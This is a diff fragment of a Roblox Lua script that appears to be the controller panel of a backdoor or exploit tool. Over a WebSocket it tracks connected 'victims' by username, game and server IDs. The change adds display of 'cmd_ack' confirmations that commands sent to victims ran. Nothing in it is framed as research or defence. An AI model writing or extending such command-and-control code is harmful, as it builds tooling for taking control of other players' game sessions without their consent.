@@ -425,15 +425,20 @@ local function connectWS()
         pcall(function()
             s.OnMessage:Connect(function(msg)
                 local success, data = pcall(function() return HttpService:JSONDecode(msg) end)
-                if success and data and (data.type == "victim_joined" or data.type == "victim_ping") and data.username then
-                    connectedVictims[data.username] = {
-                        username = data.username,
-                        placeId = data.placeId,
-                        gameId = data.gameId,
-                        jobId = data.jobId,
-                        lastSeen = tick()
-                    }
-                    if rebuildVictimsUI then rebuildVictimsUI() end
+                if success and data then
+                    if (data.type == "victim_joined" or data.type == "victim_ping") and data.username then
+                        connectedVictims[data.username] = {
+                            username = data.username,
+                            placeId = data.placeId,
+                            gameId = data.gameId,
+                            jobId = data.jobId,
+                            lastSeen = tick()
+                        }
+                        if rebuildVictimsUI then rebuildVictimsUI() end
+                    elseif data.type == "cmd_ack" then
+                        StatusBadge.Text = "\xE2\x9A\xA1 " .. tostring(data.username) .. ": " .. tostring(data.action) .. " (" .. tostring(data.status) .. ")"
+                        StatusBadge.TextColor3 = Color3.fromRGB(80, 255, 120)
+                    end
                 end
             end)
         end)
